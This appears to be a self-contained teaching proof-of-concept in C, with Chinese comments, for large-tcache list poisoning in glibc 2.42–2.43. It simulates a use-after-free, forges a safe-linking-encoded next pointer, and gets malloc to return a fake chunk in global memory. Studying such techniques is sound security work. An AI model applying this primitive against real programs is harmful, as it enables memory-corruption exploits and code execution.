/*
 * 手法：large tcache 链表投毒，适用于 glibc 2.42～2.43，x86-64。
 *
 * 模拟漏洞：释放 large chunk 后仍能写它的 user data（UAF）。
 * 成功判据：第二次 malloc(0x500) 返回全局 fake_target.data。
 *
 * 关键点：
 *   1. large tcache 在 2.42 才出现，且默认关闭；PoC 会在第一次启动时
 *      设置 GLIBC_TUNABLES 后 exec 自身。
 *   2. tcache->entries[idx] 头指针本身是明文；这里覆盖的是空闲 chunk
 *      user data 开头的 e->next，所以仍需 safe-linking 编码。
 *   3. 2.43 要求精确 size。fake target 前的 header 因而写成 0x511，
 *      与 malloc(0x500) 经 request2size 得到的 0x510 完全一致。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct fake_chunk_storage {
    uint64_t prev_size;
    uint64_t size;
    uint64_t data[4];
} __attribute__((aligned(0x10)));

static struct fake_chunk_storage fake_target;

int main(int argc, char **argv)
{
    (void)argc;
    setbuf(stdout, NULL);

    /* large tcache 默认关闭；glibc 只在进程启动时读取这个 tunable。 */
    if (getenv("LARGE_TCACHE_POC_READY") == NULL) {
        setenv("GLIBC_TUNABLES", "glibc.malloc.tcache_max=0x10000", 1);
        setenv("LARGE_TCACHE_POC_READY", "1", 1);
        execv(argv[0], argv);
        _exit(127);
    }

    uint64_t *a = malloc(0x500);  /* 物理 chunk size = 0x510。 */
    uint64_t *b = malloc(0x500);
    assert(a != NULL && b != NULL);

    free(a);
    free(b);                      /* 当前 large-tcache head 是 b，b->next 指向 a。 */

    uint64_t *target = fake_target.data;
    fake_target.size = 0x511;     /* chunksize=0x510，低位 PREV_INUSE 不参与比较。 */
    target[0] = (uintptr_t)target >> 12; /* 按 safe-linking 规则把空指针编码为 PROTECT_PTR(&target->next, NULL)。 */
    target[1] = 0;                /* 给 tcache 清 key 留出可写空间。 */

    /* 漏洞模拟：b->next = PROTECT_PTR(&b->next, target)。 */
    b[0] = ((uintptr_t)b >> 12) ^ (uintptr_t)target;

    uint64_t *first = malloc(0x500);
    uint64_t *evil = malloc(0x500);

    assert(first == b);
    assert(evil == target);
    puts("[+] large tcache：投毒成功");
    return 0;
}
